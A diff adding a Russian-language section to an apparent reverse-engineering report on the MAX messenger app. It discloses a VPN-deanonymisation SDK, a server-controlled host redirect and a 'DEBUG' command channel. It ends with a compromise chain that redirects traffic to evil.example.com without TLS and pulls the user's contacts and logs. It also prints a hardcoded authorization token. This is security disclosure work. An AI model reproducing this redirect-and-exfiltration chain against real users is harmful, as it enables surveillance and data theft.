@@ -24,6 +24,83 @@
 MAX — это форк-клиент TamTam (`ru.ok.tamtam.*` пакеты живут поверх `one.me.*`), с полным OK.ru-стеком трейсинга и аналитики, со встроенным каналом авторизации по номеру через мобильных операторов в **открытом HTTP**, с активным детектором VPN и навязчивой «отключите VPN» плашкой по серверной команде, с полноценной мини-апп платформой, в которой мини-апа может через JS-bridge получить MSISDN абонента и эмулировать NFC-карту, с серверно-управляемым killswitch-ом, который по флагу превращает любую версию в «обновитесь по нашей ссылке `https://download.max.ru/`», и с 334 серверно-управляемыми параметрами поведения (логирование чувствительных данных, отправка геолокации, отключение валидации TLS-сессии, fake-чаты, fake-in-app-review, конфиг сбора не-контактов и т. д.). E2E-шифрования нет.
 
 
+## 🔴🔴 Финальные находки реверса (17 мая 2026)
+
+> Глубокая повторная вычитка через волны параллельных субагентов нашла три находки, которые жёстче всех ранее задокументированных. См. `notes/topics/542-`, `543-`, `544-` и материалы в `notes/wave1/`, `notes/wave2/`.
+
+### 542. trace-flow.ru / DPS — отдельный SDK для деанонимизации пользователей под VPN
+
+В MAX встроен **отдельный обфусцированный SDK** под брендом `ru.trace_flow.dps` (модуль `dpslib`), все строки которого закодированы XOR-декодером `z8f.a()`. При каждом выходе приложения на передний план SDK:
+
+1. **Определяет реальный публичный IP** через 6 hardcoded внешних сервисов: `ipv4-internet.yandex.net`, `ipv6-internet.yandex.net`, `ifconfig.me`, `api.ipify.org`, `checkip.amazonaws.com`, `ip.mail.ru`. Если у пользователя VPN направляет трафик MAX через свой выход, но не перехватывает запросы к этим сервисам — определит **именно реальный** IP, а не VPN-выходной.
+2. **Детектирует VPN двумя методами**: NetworkCapabilities-API через reflection (обход hidden API restrictions) **+** перечисление сетевых интерфейсов с поиском `tun`/`ppp`/`tap`/`ipsec`. Это работает даже если VPN-приложение **не объявляет** `TRANSPORT_VPN`.
+3. **Собирает оператора** через `TelephonyManager.getNetworkOperator()` (формат `MCC:MNC:Name`, например `25001:MTS`).
+4. **Отправляет JSON-snapshot** на `https://trace-flow.ru/api/v1/report?ver=N` с заголовком `Authorization: ply5hDvhupghrHVA5rqQD1ypiXAxbmE4A68ZzBa8ioc=`. В пакет входят: `id` (UUID), `clientTs`, `appVersion`, **`ip` (реальный публичный, в чистом виде)**, `connectionType`, `operator`, `vpn` (boolean), **`deviceId`**, **`uid` (userId MAX)**, `hosts[]` с битмаской DNS/TCP/TLS-доступности.
+
+Список IP-detection доменов и список проверяемых хостов **серверно обновляемые** — превращает SDK в инструмент произвольной reachability-разведки в сети пользователя. Активация через серверный PmsKey `dps`. Provider в манифесте (`enabled="false"`) — авто-инициализация выключена; реально SDK поднимается из `AccountInitializer` после логина.
+
+Это не аналитика производительности, это **целевой инструмент деанонимизации абонентов, обходящих блокировки**, с привязкой реального IP к userId. Домен `trace-flow.ru` нигде в Privacy Policy MAX не упомянут. Без изменений в 26.16.0.
+
+Подробно: `notes/topics/542-traceflow-dps-deanonymization.md`, `notes/wave2/02-dps-traceflow-full.md`.
+
+### 543. WS-опкод RECONNECT (3) — server-side такеовер всего протокола без валидации
+
+Сервер одной WS-нотификацией опкода **3** (`fef.java`) задаёт произвольную пару `redirectHost:port` и `tls=false`. Клиент **без какой-либо валидации** (нет whitelist, нет regex по домену, нет certificate pinning, нет UI-индикации) пишет:
+
+```
+/data/data/ru.oneme.app/shared_prefs/{userId}_user_prefs.xml
+  server.host  = "<любая строка>"
+  server.port  = "<любой порт>"
+  server.useTls = false
+```
+
+Override `ri9.c()` явно сохраняет эти три ключа в локальные переменные → вызывает `super.c()` (clear all prefs) → **восстанавливает их обратно**. Это значит: redirect **переживает полный logout + повторную авторизацию**. Сбрасывается только `Settings → Apps → Clear Data`.
+
+При `tls=false` основной протокол (raw TCP socket через `tk6→jvk`) пропускает TLS-handshake. `network_security_config.xml` разрешает cleartext только для шести Mobile ID доменов, но **не защищает raw TCP** (это не HttpURLConnection — `NetworkSecurityPolicy.isCleartextTrafficPermitted()` тут не вызывается).
+
+Scope воздействия — **все 159 опкодов основного протокола**: сообщения, звонки, signaling, sync контактов/чатов/profile, NOTIF_CONFIG (распространение PmsKey), 2FA, sessions. После RECONNECT всё это идёт на произвольный хост в открытом виде. Это адресный server-side MITM. Без изменений в 26.16.0.
+
+Подробно: `notes/topics/543-reconnect-ws-server-host-takeover.md`, `notes/wave2/03-reconnect-persistence.md`.
+
+### 544. WS-опкод DEBUG (2) — прямой C2-канал с именованными командами
+
+WS-опкод **2** (`v75.java`, в 26.16.0 переименован в `fm4.java`) принимает payload `{cmd: "...", args: [...]}`. Распознаются именованные команды:
+
+- **`SYNC_CONTACTS`** — клиент принудительно выгружает на сервер **всю телефонную книгу устройства**: сначала `xh8.K()` синхронизирует внутреннюю SQLite-таблицу контактов, затем `Phonebook.checkUpdates()` читает `ContactsContract.Contacts.CONTENT_URI` и шлёт дельту.
+- **`SEND_LOG`** — клиент бросает `IllegalStateException("onNotifDebug")` → штатный crash-pipeline (`OneMeExceptionHandler.a()`) собирает stack trace, thread states, логи и (при активных PmsKey `log-full`/`log-sensitive`/`android-use-logcat-logger`) ротированный logcat → отправляет на `sdk-api.apptracer.ru` как обычный crash-репорт.
+- *(любая другая или null cmd)* — silent drop (`ay6.d` default).
+
+Поле `args:List<String>` парсится корректно, но в текущей логике **не используется** обработчиками — это готовая площадка для расширения протокола без изменения wire-format. Имя «DEBUG» — маскировка production-семантики; реально это **command-and-control канал с production-операциями выгрузки данных конкретного пользователя по запросу сервера**.
+
+Нет UI-уведомления, нет opt-out, нет rate-limiting, нет PmsKey-выключения. Без изменений в 26.16.0 (только обфускация имён классов).
+
+Подробно: `notes/topics/544-debug-ws-opcode-c2-channel.md`, `notes/wave2/01-debug-opcode-full.md`.
+
+### Связка 542 + 543 + 544 = адресная компрометация конкретного пользователя
+
+```
+1. Сервер устанавливает PmsKey "dps" = true для userId=12345 (через NOTIF_CONFIG, опкод 134).
+2. DPS на следующем foreground-transition отправляет на trace-flow.ru:
+     {uid: 12345, ip: 185.22.33.44, vpn: true, operator: "25001:MTS", deviceId: ...}
+   → известно реальное местоположение и что пользователь под VPN.
+3. Сервер шлёт WS опкод 3 (RECONNECT):
+     {redirectHost: "evil.example.com:8080", tls: false}
+   → клиент пишет server.host/port/useTls в SharedPreferences БЕЗ валидации.
+4. Весь WS-протокол (159 опкодов) идёт через evil.example.com в plain TCP.
+5. Сервер с evil.example.com шлёт WS опкод 2 (DEBUG):
+     {cmd: "SYNC_CONTACTS"}
+   → клиент выгружает всю адресную книгу.
+6. Сервер шлёт WS опкод 2 (DEBUG):
+     {cmd: "SEND_LOG"}
+   → клиент через crash-pipeline отправляет логи + (если включён log-full) logcat за период.
+7. Logout + re-login → server.host/port/useTls СОХРАНЯЮТСЯ → следующий вход уже на evil.example.com.
+```
+
+Это не «теоретическая комбинация». Все три механизма — production-код, проверены живьём в jadx-декомпиляции и smali, без изменений в 26.16.0 (только переименование классов). Все три не требуют root, не требуют debug-сборки, не требуют обновления приложения.
+
+---
+
+
 ## 1. Авторизация по номеру через мобильного оператора в открытом HTTP
 
 `res/xml/network_security_config.xml` whitelistит cleartext HTTP для шести доменов:
